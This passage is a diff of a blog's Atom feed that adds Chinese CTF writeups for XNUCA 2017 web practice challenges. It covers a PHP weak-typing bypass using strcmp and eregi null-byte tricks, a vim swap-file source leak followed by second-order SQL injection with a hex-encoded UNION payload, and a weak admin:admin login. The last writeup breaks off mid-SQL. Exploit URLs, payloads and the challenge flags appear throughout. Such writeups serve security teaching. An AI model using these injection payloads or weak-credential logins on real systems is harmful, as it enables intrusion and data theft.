@@ -241,13 +241,175 @@
   </entry>
   
   <entry>
-    <title>XNUCA 2017-Web专题赛前指导(1)-writeup</title>
-    <link href="http://yoursite.com/2017/08/14/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-1-writeup/"/>
-    <id>http://yoursite.com/2017/08/14/XNUCA-2017-Web专题赛前指导-1-writeup/</id>
-    <published>2017-08-14T08:08:23.000Z</published>
-    <updated>2017-08-14T11:26:27.682Z</updated>
+    <title>XNUCA 2017-Web专题赛前指导-php是最好的语言-writeup</title>
+    <link href="http://yoursite.com/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/"/>
+    <id>http://yoursite.com/2017/08/18/XNUCA-2017-Web专题赛前指导-php是最好的语言-writeup/</id>
+    <published>2017-08-18T09:45:39.000Z</published>
+    <updated>2017-08-18T11:41:14.546Z</updated>
     
-    <content type="html"><![CDATA[<p>XNUCA 2017-Web专题赛前指导(1)-writeup<br>这些都是一些很简单的题。另有一些题会单独拿出来写。<br><a id="more"></a></p>
+    <content type="html"><![CDATA[<p>php弱类型比较<br>strcmp、eregi<br><a id="more"></a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>源代码如下:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line">$v1=<span class="number">0</span>;$v2=<span class="number">0</span>;$v3=<span class="number">0</span>;</div><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">   is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">   <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">	   ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	   <span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	   $pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	   $pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   <span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		   $val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   &#125;</div><div class="line">	   $v2=<span class="number">1</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>接下来逐步分析。目标是让v1，v2，v3都为 1，这样才能得到flag。</p>
+<h2 id="v1"><a href="#v1" class="headerlink" title="v1"></a>v1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$a=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'foo'</span>]);</div><div class="line"><span class="keyword">if</span>(is_array($a))&#123;</div><div class="line">    is_numeric(@$a[<span class="string">"bar1"</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">    <span class="keyword">if</span>(@$a[<span class="string">"bar1"</span>])&#123;</div><div class="line">        ($a[<span class="string">"bar1"</span>]&gt;<span class="number">2016</span>)?$v1=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">    &#125;</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>传入的foo，经过一次json_decode，然后转换成array。然后判断 <code>$a[&quot;bar1&quot;]</code> 是否满足 is_numeric，若满足则die掉。接下来又判断 <code>$a[&quot;bar1&quot;]</code> 是否大于 2016 。</p>
+<p>利用php弱类型特性，可以设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;bar1&quot;] = 2017a</div></pre></td></tr></table></figure></p>
+<p>这样is_numeric时会判断其为字符串而不是数字，而在与2016的比较中，会直接转换成2017，满足大于2016。这样 v1 就被设置为 1 了。</p>
+<h2 id="v2"><a href="#v2" class="headerlink" title="v2"></a>v2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(is_array(@$a[<span class="string">"bar2"</span>]))&#123;</div><div class="line">	<span class="keyword">if</span>(count($a[<span class="string">"bar2"</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array($a[<span class="string">"bar2"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"nope"</span>);</div><div class="line">	$pos = array_search(<span class="string">"nudt"</span>, $a[<span class="string">"a2"</span>]);</div><div class="line">	$pos===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	<span class="keyword">foreach</span>($a[<span class="string">"bar2"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</div><div class="line">		$val===<span class="string">"nudt"</span>?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	&#125;</div><div class="line">	$v2=<span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>接下来，要求<code>$a[&quot;bar2&quot;]</code>是个数组，其中元素的个数为5个（count($a[“bar2”])!==5），同时要求<code>$a[&quot;bar2&quot;][0]</code>是数组。所以我们设置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;bar2&quot;] = [[],2,3,4,5]</div></pre></td></tr></table></figure></p>
+<p>对于 <code>$pos = array_search(&quot;nudt&quot;, $a[&quot;a2&quot;]);</code>，它搜索字符串“nudt”在$a[“a2”]中的位置。若没有找到，array_search返回false，会通过严格比较导致die掉。所以这里要设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$a[&quot;a2&quot;] = “nudt”</div></pre></td></tr></table></figure></p>
+<p>注意这里因为用了<code>$pos===false?</code>的严格比较，所以0不<code>===</code>false。</p>
+<p>之后就能设置 v2 = 1</p>
+<p>结合$a是由json_decode得来，所以第一个payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">foo=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="v3"><a href="#v3" class="headerlink" title="v3"></a>v3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$c=@$_GET[<span class="string">'cat'</span>];</div><div class="line">$d=@$_GET[<span class="string">'dog'</span>];</div><div class="line"><span class="keyword">if</span>(@$c[<span class="number">1</span>])&#123;</div><div class="line">   <span class="keyword">if</span>(!strcmp($c[<span class="number">1</span>],$d) &amp;&amp; $c[<span class="number">1</span>]!==$d)&#123;</div><div class="line">	   eregi(<span class="string">"3|1|c"</span>,$d.$c[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">"nope"</span>):<span class="keyword">NULL</span>;</div><div class="line">	   strpos(($c[<span class="number">0</span>].$d), <span class="string">"htctf2016"</span>)?$v3=<span class="number">1</span>:<span class="keyword">NULL</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123;</div><div class="line">   <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">   <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>先会用strcmp进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置cat[1]为一个数组。</p>
+<p>接下来用eregi对拼接后的字符串<code>$d.$c[0]</code>进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串<code>$c[0].$d</code>中要有字符串“htctf2016”。这里利用%00对eregi的截断功能，则在正则匹配eregi时在开头时就匹配结束掉。</p>
+<p><code>strpos(($c[0].$d), &quot;htctf2016&quot;)</code>中，还要求“htctf2016”不能出现在开头。</p>
+<p>所以设置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$d = %00 即 dog=%00</div><div class="line"></div><div class="line">$c[0]  = &quot;ahtctf2016&quot;</div></pre></td></tr></table></figure></p>
+<p>所以综上所述，构造总的payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017e&quot;,&quot;bar2&quot;:[[],2,3,4,5],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=ahtctf2016&amp;cat[1][]=&amp;dog=%00</div></pre></td></tr></table></figure></p>
+<p>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php_i5_n0t_b4d</div></pre></td></tr></table></figure></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>题目已收录进：<a href="https://github.com/CHYbeta/CTF-Web-Challenge/blob/master/php/challenge-2.md" target="_blank" rel="external">CTF-Web-Challenge-php：challenge-2</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;php弱类型比较&lt;br&gt;strcmp、eregi&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNUCA 2017-Web专题赛前指导-vote-writeup</title>
+    <link href="http://yoursite.com/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-vote-writeup/"/>
+    <id>http://yoursite.com/2017/08/18/XNUCA-2017-Web专题赛前指导-vote-writeup/</id>
+    <published>2017-08-18T08:44:33.000Z</published>
+    <updated>2017-08-18T11:40:14.474Z</updated>
+    
+    <content type="html"><![CDATA[<p>源码泄露、二次注入<br><a id="more"></a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：据说可以注入，然而……</div><div class="line"></div><div class="line">http://218.76.35.75:65080/</div></pre></td></tr></table></figure>
+<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>一个简单的投票功能。初步测试后没有回显，没有报错。在CTF中，越是简单越是没有提示的，往往都有源码泄露之类的。</p>
+<h2 id="源码泄露-恢复"><a href="#源码泄露-恢复" class="headerlink" title="源码泄露/恢复"></a>源码泄露/恢复</h2><p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:65080/.index.php.swp</div></pre></td></tr></table></figure></p>
+<p>下载下来，win下下下来后文件名变成了index.php.swp。用vim恢复文件。命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim -r index.php</div></pre></td></tr></table></figure></p>
+<p>直接在vim中看可能不太方便，可以用下面的命令将其另存为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">w filename</div></pre></td></tr></table></figure></p>
+<p>得到恢复后的源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'db.php'</span>;</div><div class="line">session_start();</div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</div><div class="line">	$_SESSION[<span class="string">'login'</span>] = <span class="string">'guest'</span>.mt_rand(<span class="number">1e5</span>, <span class="number">1e6</span>);</div><div class="line">&#125;</div><div class="line">$login = $_SESSION[<span class="string">'login'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</div><div class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>], $_POST[<span class="string">'vote'</span>]) || !is_numeric($_POST[<span class="string">'id'</span>]))</div><div class="line">		<span class="keyword">die</span>(<span class="string">'please select ...'</span>);</div><div class="line">	$id = $_POST[<span class="string">'id'</span>];</div><div class="line">	$vote = (int)$_POST[<span class="string">'vote'</span>];</div><div class="line">	<span class="keyword">if</span> ($vote &gt; <span class="number">5</span> || $vote &lt; <span class="number">1</span>)</div><div class="line">		$vote = <span class="number">1</span>;</div><div class="line">	$q = mysql_query(<span class="string">"INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, '&#123;$login&#125;')"</span>);</div><div class="line">	$q = mysql_query(<span class="string">"SELECT id FROM t_vote WHERE user = '&#123;$login&#125;' GROUP BY id"</span>);</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;b&gt;Thank you!&lt;/b&gt; Results:&lt;/p&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;table border="1"&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;tr&gt;&lt;th&gt;Logo&lt;/th&gt;&lt;th&gt;Total votes&lt;/th&gt;&lt;th&gt;Average&lt;/th&gt;&lt;/tr&gt;'</span>;</div><div class="line">	<span class="keyword">while</span> ($r = mysql_fetch_array($q)) &#123;</div><div class="line">		$arr = mysql_fetch_array(mysql_query(<span class="string">"SELECT title FROM t_picture WHERE id = "</span>.$r[<span class="string">'id'</span>]));</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;tr&gt;&lt;td&gt;'</span>.$arr[<span class="number">0</span>].<span class="string">'&lt;/td&gt;'</span>;</div><div class="line">		$arr = mysql_fetch_array(mysql_query(<span class="string">"SELECT COUNT(value), AVG(value) FROM t_vote WHERE id = "</span>.$r[<span class="string">'id'</span>]));</div><div class="line">		<span class="keyword">echo</span> <span class="string">'&lt;td&gt;'</span>.$arr[<span class="number">0</span>].<span class="string">'&lt;/td&gt;&lt;td&gt;'</span>.round($arr[<span class="number">1</span>],<span class="number">2</span>).<span class="string">'&lt;/td&gt;&lt;/tr&gt;'</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/table&gt;'</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;a href="index.php"&gt;goBack&lt;/a&gt;&lt;br&gt;'</span>;</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;Movie vote&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;p&gt;Welcome, Movie vote&lt;/p&gt;</div><div class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"POST"</span>&gt;</div><div class="line">&lt;table border=<span class="string">"1"</span> cellspacing=<span class="string">"5"</span>&gt;</div><div class="line">&lt;tr&gt;</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$q = mysql_query(<span class="string">'SELECT * FROM t_picture'</span>);</div><div class="line"><span class="keyword">while</span> ($r = mysql_fetch_array($q)) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;td&gt;&lt;img src="./images/'</span>.$r[<span class="string">'image'</span>].<span class="string">'"&gt;&lt;div align="center"&gt;'</span>.$r[<span class="string">'title'</span>].<span class="string">'&lt;br&gt;&lt;input type="radio" name="id" value="'</span>.$r[<span class="string">'id'</span>].<span class="string">'"&gt;&lt;/div&gt;&lt;/td&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;/tr&gt;</div><div class="line">&lt;/table&gt;</div><div class="line">&lt;p&gt;Your vote:</div><div class="line">&lt;select name=<span class="string">"vote"</span>&gt;</div><div class="line">&lt;option value=<span class="string">"1"</span>&gt;<span class="number">1</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"2"</span>&gt;<span class="number">2</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"3"</span>&gt;<span class="number">3</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"4"</span>&gt;<span class="number">4</span>&lt;/option&gt;</div><div class="line">&lt;option value=<span class="string">"5"</span>&gt;<span class="number">5</span>&lt;/option&gt;</div><div class="line">&lt;/select&gt;&lt;/p&gt;</div><div class="line">&lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"Submit"</span>&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>注入点在这里：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!isset($_POST[&apos;id&apos;], $_POST[&apos;vote&apos;]) || !is_numeric($_POST[&apos;id&apos;]))</div></pre></td></tr></table></figure></p>
+<p>post进的参数id，经过php的函数is_numeric()检测后，insert到数据库中；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$q = mysql_query(&quot;INSERT INTO t_vote VALUES (&#123;$id&#125;, &#123;$vote&#125;, &apos;&#123;$login&#125;&apos;)&quot;);</div></pre></td></tr></table></figure></p>
+<p>在完成投票后，根据id值将title取出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$q = mysql_query(&quot;SELECT id FROM t_vote WHERE user = &apos;&#123;$login&#125;&apos; GROUP BY id&quot;);</div><div class="line">。。。</div><div class="line">$r = mysql_fetch_array($q)</div><div class="line">。。。</div><div class="line">$arr = mysql_fetch_array(mysql_query(&quot;SELECT title FROM t_picture WHERE id = &quot;.$r[&apos;id&apos;]));</div><div class="line">echo &apos;&lt;tr&gt;&lt;td&gt;&apos;.$arr[0].&apos;&lt;/td&gt;&apos;;</div></pre></td></tr></table></figure></p>
+<p>当我们传入经过十六进制转换的payload后，通过is_numeric()的检查，然后被插入到数据库中。而mysql将数据取出来时候会自动unhex一下，从而造成sql注入。</p>
+<p>根据泄露出来的源码，我们推测表为 t_flag，字段为flag。我们要注入后的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT title FROM t_picture WHERE id = -2  UNION SELECT GROUP_CONCAT(flag) FROM t_flag</div></pre></td></tr></table></figure></p>
+<p>这样因为不存在id为-2，从而能显示出flag。即payload为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">hex(-2  UNION SELECT GROUP_CONCAT(flag) FROM t_flag)</div><div class="line"></div><div class="line">	=&gt;</div><div class="line"></div><div class="line">0x2d322020554e494f4e2053454c4543542047524f55505f434f4e43415428666c6167292046524f4d20745f666c6167</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170818/1.png?raw=true" alt=""></p>
+<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">6yvt6eYziAHgVRKz3re</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;源码泄露、二次注入&lt;br&gt;
+    
+    </summary>
+    
+      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>XNUCA 2017-Web专题赛前指导-最安全的笔记管理系统-writeup</title>
+    <link href="http://yoursite.com/2017/08/17/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-%E6%9C%80%E5%AE%89%E5%85%A8%E7%9A%84%E7%AC%94%E8%AE%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-writeup/"/>
+    <id>http://yoursite.com/2017/08/17/XNUCA-2017-Web专题赛前指导-最安全的笔记管理系统-writeup/</id>
+    <published>2017-08-17T08:06:08.000Z</published>
+    <updated>2017-08-18T11:42:47.820Z</updated>
+    
+    <content type="html"><![CDATA[<p>未完待续<br><a id="more"></a></p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">描述：没错，就是最安全的笔记管理系统，快来管理你的笔记吧~</div><div class="line"></div><div class="line">http://218.76.35.74:20128</div></pre></td></tr></table></figure>
+<p>访问后有一个登陆。用弱口令admin：admin可以进入。登陆后出现一个hint：./dbinit.sql</p>
+<p>访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.74:20128/dbinit.sql</div></pre></td></tr></table></figure></p>
+<p>得到如下信息：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`taolu`</span> <span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</div><div class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`user`</span>;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`user`</span>(</div><div class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> primary  <span class="keyword">key</span>  auto_increment,</div><div class="line">    <span class="string">`uname`</span> <span class="built_in">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">    <span class="string">`level`</span> tinyint <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">)<span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</div><div class="line"></div><div class="line"><span class="keyword">drop</span>  <span class="keyword">table</span> <span class="keyword">if</span>  <span class="keyword">exists</span> <span class="string">`note`</span>;</div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`note`</span> (</div><div class="line"></div><div class="line">     <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> primary <span class="keyword">key</span> auto_increment,</div><div class="line">     <span class="string">`content`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">     <span class="string">`title`</span>  <span class="built_in">varchar</span>(<span class="number">255</span>)  <span class="keyword">not</span> <span class="literal">null</span>,</div><div class="line">     <span class="string">`userid`</span>  <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span></div><div class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8 ;</div><div class="line"></div><div class="line"><span class="keyword">drop</span> <span class="keyword">table</span>  <span class="keyword">if</span> <span class="keyword">exists</span> <span class="string">`page`</span> ;</div><div class="line"></div><div class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`page`</span> (</div><div class="line">    <span class="string">`num`</span> <span class="built_in">varchar</span> <span class="keyword">not</span> <span class="literal">null</span></div><div 